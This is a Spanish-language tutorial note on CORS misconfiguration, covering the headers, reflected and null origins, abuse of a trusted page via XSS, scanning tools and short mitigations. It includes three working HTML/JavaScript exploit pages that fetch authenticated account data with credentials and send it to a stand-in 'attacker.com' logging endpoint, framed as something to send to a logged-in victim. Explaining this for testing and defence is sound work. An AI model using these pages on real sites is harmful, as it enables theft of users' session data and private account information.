# CORS

## Table of contents

- [CORS](#cors)
  - [Que es?](#que-es)
  - [ABUSO DEL CORS](#abuso-del-cors)
    - [CORS - ORIGEN REFLEJADO](#cors---origen-reflejado)
      - [OBTENER ALGUNAS CREDENCIALES](#obtener-algunas-credenciales)
    - [ACAO en NULL](#acao-en-null)
    - [XSS A TRAVES DE LA PAGINA EN QUE SE CONFIA](#xss-a-traves-de-la-pagina-en-que-se-confia)
  - [Herramientas para verificacion del CORS](#herramientas-para-verificacion-del-cors)
  - [MITIGACIONES](#mitigaciones)

## Que es?
El intercambio de recursos de origen cruzado (CORS) es un mecanismo de navegador que permite el acceso controlado a los recursos ubicados fuera de un dominio determinado. Extiende y agrega flexibilidad a la política del mismo origen (**SOP**). Sin embargo, también ofrece la posibilidad de ataques basados en dominios cruzados, si la política CORS de un sitio web está mal configurada e implementada. CORS no es una protección contra ataques de origen cruzado) , como la falsificación de solicitudes entre sitios (CSRF).

El CORS nos permite configurar el SOP para que no aplique si se cumple ciertas condiciones, en otras palabras, gracias al CORS tenemos la posibilidad de configurar un servidor para que un cliente de otro origen pueda comunicarse con él sin problemas.

el CORS son unas cabeceras HTTP que el servidor añade desde su lado, para dejar constancia de lo que permite y lo que no. En concreto, las dos cabeceras relacionadas con el CORS, son:

- Access-Control-Allow-Origin
- Access-Control-Allow-Credentials

Estas son las mas importantes a la hora de configurar, pero tambien hay estas:

- Access-Control-Allow-Headers: indica que headers estan permitidos.

```bash
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
```

- Access-Control-Allow-Methods: Indica que metodos estan permitidos.

```bash
Access-Control-Allow-Methods: POST, GET, OPTIONS
```

- Access-Control-Max-Age: indica el tiempo maximo en segundos que se almacena la informacion web en cache.

```bash
Access-Control-Max-Age: 86400
```


## ABUSO DEL CORS

-   **Access-Control-Allow-Origin:** indica con que origen puede ser compartida la respuesta. El origen es un dominio (con subdominios).

![[Pasted image 20220623172726.png]]

la Web B me dice en su respuesta que puedo compartirla con la Web A. Por lo tanto, la Web A recibe la respuesta de la petición que hizo sin problemas, y puede leerla perfectamente.

en caso de que el servidor no responda con la cabecera:

![[Pasted image 20220623172905.png]]

Como en ningún lado la cabecera CORS, por lo tanto, aplico el SOP. ¿Son ambos orígenes el mismo? No, por lo tanto, no dejo que la Web A lea la respuesta que la Web B ha dado.

puede tener estos 3 valores:

-   Access-Control-Allow-Origin: *
-   Access-Control-Allow-Origin: \<origen\>
-   Access-Control-Allow-Origin: null
	
El valor * (asterisco), permitirá que cualquier origen tenga la capacidad de leer las respuestas del servidor

El segundo posible valor de la cabecera es un origen concreto que especifiques, por ejemplo:

```bash
Access-Control-Allow-Origin: https://deephacking.tech:8080
```

 no puedes añadir múltiples orígenes, de esta manera, solo permite un único valor. Aunque hay algunos artificios para hacer algo parecido.
 
 Por último, el tercer valor (null) permitiría que los orígenes null tengan la capacidad de leer las respuestas del servidor. Ahora bien, ¿en qué casos, el origen tendría como valor null? Pues este valor se suele establecer cuando abrimos un archivo HTML desde el esplorador de archivos y en el navegador la ruta aparece con `file:///`.

-   **Access-Control-Allow-Credentials:** esta cabecera habilita la lectura de la respuesta del servidor cuando esta posee credenciales, dicho de otra forma, cookies de sesión y demás, dicho también de otra forma, la lectura de recursos autenticados. Con esta cabecera establecida en `true` y las cookies correctas puede ver contenido autenticado.

El único valor posible para esta cabecera es true (false no aplicaría porque en ese caso simplemente la cabecera no se pondría).

**detalle importante sobre esta cabecera es que no está permitida cuando el valor de la cabecera Access-Control-Allow-Origin es *.**

### CORS - ORIGEN REFLEJADO

El header `Access-Control-Allow-Origin` es el encabezado que anteriormente se menciono. Un navegador web compara ` Access-Control-Allow-Origin` con el origen del sitio web solicitante y permite el acceso a la respuesta si coinciden.

Este encabezado es devuelto por un servidor cuando un sitio web solicita un recurso entre dominios, con un `Origin` encabezado agregado por el navegador.

Por ejemplo, supongamos que un sitio web con origen `normal-website.com` genera la siguiente solicitud entre dominios:

```http
GET /data HTTP/1.1  
Host: robust-website.com  
Origin : https://normal-website.com
```

El servidor de `robust-website.com` devuelve la siguiente respuesta:

```http
HTTP/1.1 200 OK  
...  
Access-Control-Allow-Origin: https://normal-website.com
```

El navegador permitirá que el código en ejecución `normal-website.com` acceda a la respuesta porque los orígenes coinciden.

muchas veces la validacion que hace la pagina es que toma el valor de `origin` de la request para agregarlo a la cabecera `Access-Control-Allow-Origin` (origen reflejado), esto es una mala configuracion porque deja interactuar con cualquier pagina.

A menudo surgen errores al implementar listas blancas de origen de CORS. Algunas organizaciones deciden permitir el acceso desde todos sus subdominios (incluidos los futuros subdominios que aún no existen).

```http
HTTP/1.1 200 OK  
...  
Access-Control-Allow-Origin: *.normal-website.com
```

Un atacante podría obtener acceso registrando el dominio:

```bash
hackersnormal-website.com
```

Alternativamente, suponga que una aplicación otorga acceso a todos los dominios **que comienzan con `normal-website.com`:**

```http
HTTP/1.1 200 OK  
...  
Access-Control-Allow-Origin: normal-website.com.*
```

Un atacante podría obtener acceso utilizando el dominio:

```bash
normal-website.com.evil-user.net
```

#### OBTENER ALGUNAS CREDENCIALES

El comportamiento predeterminado de las solicitudes de recursos de origen cruzado es que las solicitudes se pasen sin credenciales, como cookies y el encabezado de autorización. Sin embargo, el servidor entre dominios puede permitir la lectura de la respuesta cuando se le pasan credenciales estableciendo el encabezado `Access-Control-Allow-Credentials`  CORS en `True`. Ahora bien, si el sitio web solicitante utiliza JavaScript para declarar que está enviando cookies con la solicitud:

```http
GET /data HTTP/1.1  
Host: robust-website.com  
...  
Origin: https://normal-website.com  
Cookie: JSESSIONID=<value>
```

Y la respuesta a la solicitud es:

```http
HTTP/1.1 200 OK  
...  
Access-Control-Allow-Origin: https://normal-website.com  
Access-Control-Allow-Credentials: true
```

Luego, el navegador permitirá que el sitio web solicitante lea la respuesta, porque el encabezado`Access-Control-Allow-Credentials`  de la respuesta está configurado en `true`. De lo contrario, el navegador no permitirá el acceso a la respuesta.

--------------------------------------------------------------------------

Podemos recuperar del lado del cliente las cookies para poder robar sesiones por ejemplo y mediante ingenieria social para una url maliciosa a la victima.

imaginemos que en una pagina que utiliza cookies para el manejo de sesiones te das cuenta de que a la hora de consultar tu perfil o cualquier otro apartado te devuelve la siguiente configuracion:

```http
...
Access-Control-Allow-Origin: https://normal-website.com  
Access-Control-Allow-Credentials: true
```

(podemos validar esto creandonos una cuenta en la pagina vulnerable e interceptando las peticiones)

podemos utilizar JS para crear una pagina maliciosa:

```html
<html>
	<body>
		<script> 
			var req = new XMLHttpRequest(); 
			req.onload = reqListener; 
			req.open('get','https://vulnerable.site/accountDetails',true); 
			req.withCredentials = true; #para que capture las credenciales
			req.send(); 
			
			function reqListener() 
			{ 
				mi_web_server='https://attacker.com'
				location=mi_web_server+'/log?key='+this.responseText; 
			}; 
		</script>
	</body>
</html>
```

se lo enviamos a la victima (previamente logueada en `https://vulnerable.site`) y cuando habra el archivo html, hara una peticion a la ruta la cual tiene la mala configuracion del CORS y nos enviara sus cookies, apikeys y demas a nuestro servidor web (en los logs o consola).


### ACAO en NULL

Puede que el CORS este mal configurado y el valor de `Access-Control-Allow-Origin` este definido en `null`, en caso de encontrarse con esta configuracion para las `Access-Control-Allow-Credentials` en `true`:

```http
...
Access-Control-Allow-Origin: null  
Access-Control-Allow-Credentials: true
```

podemos utilizar el mismo ataque visto anteriormente usando JS pero para que simule tener un origen null la peticion debemos colocarle en un `iframe`:

```html
<html>
	<body>
		<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 		src="data:text/html,<script> 
																					 
			var req = new XMLHttpRequest(); 
			req.onload = reqListener; 
			req.open('get','https://vulnerable.site/accountDetails',true); 
			req.withCredentials = true; #para que capture las credenciales
			req.send(); 
			
			function reqListener() 
			{ 
				mi_web_server='https://attacker.com'
				location=mi_web_server+'/log?key='+this.responseText; 
			}; 
		</script>"></iframe>
	</body>
</html>
```

### XSS A TRAVES DE LA PAGINA EN QUE SE CONFIA

Incluso CORS configurado "correctamente" establece una relación de confianza entre dos orígenes. Por ejemplo:

**Pagina B** confia en **Pagina A**

```http
GET /data HTTP/1.1  
Host: paginaB.com  
Origin : paginaA.com
```

El servidor de `robust-website.com` devuelve la siguiente respuesta:

```http
HTTP/1.1 200 OK  
...  
Access-Control-Allow-Origin: paginaA.com
```

Si la **Pagina A** es vulnerable a **XSS**, entonces un atacante podría explotar el **XSS** para inyectar código JavaScript que usa CORS para recuperar información confidencial del sitio que confía en la aplicación vulnerable. (**Pagina B**)

creacion de una pagina HTML maliciosa:

```html
<html>
	<body>
		<script> 
			document.location="http://paginaA.com/productos?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://paginaB.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://attacker.com/log?key='%2bthis.responseText; };%3c/script>&storeId=1" 
		</script>
	</body>
</html>
```

## Herramientas para verificacion del CORS

Encontrar misconfiguration:

[Corsy](https://github.com/s0md3v/Corsy)
[CORScanner](https://github.com/chenjj/CORScanner)

## MITIGACIONES
Las vulnerabilidades de CORS surgen principalmente como errores de configuración. La prevención es, por tanto, un problema de configuración. Las siguientes secciones describen algunas defensas efectivas contra los ataques CORS.

- Permitir solo sitios de confianza
- Evitar el valor NULL en le ACAO
- Evitar comodines en redes internas.
